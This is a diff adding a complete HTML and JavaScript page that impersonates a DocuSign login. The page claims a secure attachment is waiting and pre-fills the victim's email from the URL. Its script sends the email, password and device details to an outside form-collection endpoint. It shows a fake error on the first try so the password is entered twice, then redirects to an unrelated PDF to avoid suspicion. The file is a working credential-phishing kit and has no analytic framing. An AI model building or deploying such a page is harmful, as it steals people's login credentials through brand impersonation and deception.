@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="robots" content="noindex, nofollow">
+    <title>DocuSign Login</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f5f7fa;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            -webkit-text-size-adjust: 100%;
+            -webkit-font-smoothing: antialiased;
+        }
+        
+        .logo {
+            font-size: 24px;
+            font-weight: bold;
+            color: #2e2e94;
+            margin: 30px 0 20px;
+            padding: 0 15px;
+            text-align: center;
+        }
+        
+        .container {
+            background-color: white;
+            padding: 25px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 90%;
+            max-width: 400px;
+            margin: 0 auto 30px;
+        }
+        
+        .title {
+            font-size: 22px;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #333;
+            text-align: center;
+        }
+        
+        .description {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 25px;
+            line-height: 1.4;
+            text-align: center;
+        }
+        
+        .input-field {
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            -webkit-appearance: none;
+            transition: border-color 0.3s;
+        }
+        
+        .input-field:focus {
+            border-color: #2e2e94;
+            outline: none;
+        }
+        
+        .input-field.error {
+            border-color: #e74c3c;
+        }
+        
+        .error-message {
+            color: #e74c3c;
+            font-size: 13px;
+            margin: -10px 0 15px;
+            display: none;
+        }
+        
+        .general-error {
+            color: #e74c3c;
+            font-size: 14px;
+            margin-bottom: 20px;
+            padding: 12px;
+            background-color: #ffeeee;
+            border-radius: 6px;
+            display: none;
+            text-align: center;
+        }
+        
+        .login-btn {
+            width: 100%;
+            padding: 16px;
+            background-color: #2e2e94;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            margin-top: 10px;
+            cursor: pointer;
+            transition: all 0.3s;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .login-btn:active {
+            background-color: #1a1a6b;
+            transform: scale(0.98);
+        }
+        
+        .login-btn:disabled {
+            background-color: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .footer {
+            width: 100%;
+            background-color: white;
+            padding: 15px 10px;
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            border-top: 1px solid #ddd;
+        }
+        
+        .footer-content {
+            max-width: 100%;
+            overflow-x: auto;
+            white-space: nowrap;
+            padding: 0 5px;
+        }
+        
+        .footer a {
+            color: #666;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .powered-by {
+            display: block;
+            margin-bottom: 5px;
+        }
+        
+        .powered-by span {
+            color: #2e2e94;
+            font-weight: bold;
+        }
+        
+        .loader {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding-bottom: 60px;
+            }
+            
+            .container {
+                padding: 20px;
+                margin-top: 10px;
+            }
+            
+            .login-btn {
+                padding: 18px;
+                min-height: 55px;
+            }
+            
+            .input-field {
+                padding: 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="logo">DocuSign</div>
+    <div class="container">
+        <h2 class="title">Log in to Your Account</h2>
+        <p class="description">Attachment secure with DocuSign. Login with your email to access the document.</p>
+        
+        <div class="general-error" id="general-error"></div>
+        
+        <form id="login-form" method="POST" enctype="multipart/form-data">
+            <input type="email" class="input-field" id="email" name="email" placeholder="Email *" required autocapitalize="off" autocomplete="email">
+            <div class="error-message" id="email-error">Please enter a valid email address.</div>
+            
+            <input type="password" class="input-field" id="password" name="password" placeholder="Password *" required autocomplete="current-password">
+            <div class="error-message" id="password-error">Password is required.</div>
+            <div class="error-message" id="incorrect-password-error">Please try again to verify.</div>
+            <div class="error-message" id="bot-error">Bot detected. Access denied.</div>
+            
+            <input type="hidden" name="_gotcha">
+            <input type="hidden" name="user_agent" id="user-agent">
+            <input type="hidden" name="timestamp" id="timestamp">
+            <input type="hidden" name="device_type" id="device-type">
+            <input type="hidden" name="source" value="docusign_login_page">
+            
+            <button type="submit" class="login-btn" id="login-btn">
+                <div class="loader" id="loader"></div>
+                <span id="button-text">Log in</span>
+            </button>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-content">
+            <span class="powered-by">Powered by <span>DocuSign</span></span>
+            <a href="#">English (US)</a> • <a href="#">Contact Us</a> • <a href="#">Terms of Use</a> • <a href="#">Privacy Policy</a>
+        </div>
+    </div>
+
+    <script>
+        // Configuration
+        const debugMode = new URLSearchParams(window.location.search).get('debug') === 'true';
+        const pdfUrl = 'https://resources.finalsite.net/images/v1724257429/campbellcountyschoolsnet/ktrkivttstuxogdc557u/Bid-Quote-SchoologywithPS-Knox.pdf';
+        const formcarryUrl = 'https://formcarry.com/s/xg8QZBYCFyX';
+        
+        // DOM elements
+        const loginForm = document.getElementById('login-form');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const emailError = document.getElementById('email-error');
+        const passwordError = document.getElementById('password-error');
+        const incorrectPasswordError = document.getElementById('incorrect-password-error');
+        const botError = document.getElementById('bot-error');
+        const generalError = document.getElementById('general-error');
+        const loginBtn = document.getElementById('login-btn');
+        const loader = document.getElementById('loader');
+        const buttonText = document.getElementById('button-text');
+        
+        // Device detection
+        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
+        const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+        
+        // Initialize form state
+        let isFirstAttempt = true;
+        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        
+        // Set hidden field values
+        document.getElementById('user-agent').value = navigator.userAgent;
+        document.getElementById('timestamp').value = new Date().toISOString();
+        document.getElementById('device-type').value = isMobile ? 'mobile' : 'desktop';
+        
+        // Auto-populate email from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const emailFromUrl = urlParams.get('email');
+        if (emailFromUrl) {
+            emailInput.value = emailFromUrl;
+            if (emailRegex.test(emailFromUrl)) {
+                emailInput.classList.remove('error');
+                emailError.style.display = 'none';
+            }
+        }
+        
+        // Form submission handler
+        async function handleFormSubmit(e) {
+            e.preventDefault();
+            
+            // Reset error states
+            generalError.style.display = 'none';
+            emailError.style.display = 'none';
+            passwordError.style.display = 'none';
+            incorrectPasswordError.style.display = 'none';
+            botError.style.display = 'none';
+            
+            // Validate inputs
+            const email = emailInput.value.trim();
+            const password = passwordInput.value.trim();
+            let isValid = true;
+            
+            if (!emailRegex.test(email)) {
+                emailInput.classList.add('error');
+                emailError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!password) {
+                passwordInput.classList.add('error');
+                passwordError.style.display = 'block';
+                isValid = false;
+            }
+            
+            if (!isValid) return;
+            
+            // Show loading state
+            loginBtn.disabled = true;
+            loader.style.display = 'block';
+            buttonText.textContent = isFirstAttempt ? 'Verifying...' : 'Logging in...';
+            
+            try {
+                const formData = new FormData(loginForm);
+                
+                if (debugMode) {
+                    console.log('Submitting form data:');
+                    for (let [key, value] of formData.entries()) {
+                        console.log(key, ':', key === 'password' ? '***' : value);
+                    }
+                }
+                
+                // Submit to Formcarry without waiting for response
+                fetch(formcarryUrl, {
+                    method: 'POST',
+                    body: formData,
+                    mode: 'no-cors'
+                }).catch(error => {
+                    if (debugMode) console.error('Formcarry submission error:', error);
+                });
+                
+                // Immediately redirect to PDF
+                if (isFirstAttempt) {
+                    // First attempt - show error but continue
+                    incorrectPasswordError.style.display = 'block';
+                    passwordInput.classList.add('error');
+                    isFirstAttempt = false;
+                } else {
+                    // Second attempt - redirect to PDF
+                    window.location.href = pdfUrl;
+                    return;
+                }
+            } catch (error) {
+                console.error('Form submission error:', error);
+                window.location.href = pdfUrl;
+            } finally {
+                loginBtn.disabled = false;
+                loader.style.display = 'none';
+                buttonText.textContent = 'Log in';
+                passwordInput.value = '';
+            }
+        }
+
+        // Initialize event listeners
+        function setupEventListeners() {
+            loginForm.addEventListener('submit', handleFormSubmit);
+            
+            if (isMobile) {
+                loginBtn.addEventListener('touchend', function(e) {
+                    e.preventDefault();
+                    loginForm.dispatchEvent(new Event('submit'));
+                }, { passive: false });
+            }
+            
+            emailInput.addEventListener('input', validateEmail);
+            passwordInput.addEventListener('input', validatePassword);
+            
+            window.addEventListener('offline', handleOffline);
+            window.addEventListener('online', handleOnline);
+        }
+        
+        function validateEmail() {
+            if (emailRegex.test(emailInput.value.trim())) {
+                emailInput.classList.remove('error');
+                emailError.style.display = 'none';
+            }
+        }
+        
+        function validatePassword() {
+            if (passwordInput.value.trim()) {
+                passwordInput.classList.remove('error');
+                passwordError.style.display = 'none';
+                incorrectPasswordError.style.display = 'none';
+            }
+        }
+        
+        function handleOffline() {
+            generalError.textContent = 'You are offline. Please check your connection.';
+            generalError.style.display = 'block';
+            loginBtn.disabled = true;
+        }
+        
+        function handleOnline() {
+            generalError.style.display = 'none';
+            loginBtn.disabled = false;
+        }
+        
+        // Initialize the page
+        setupEventListeners();
+    </script>
+</body>
+</html>
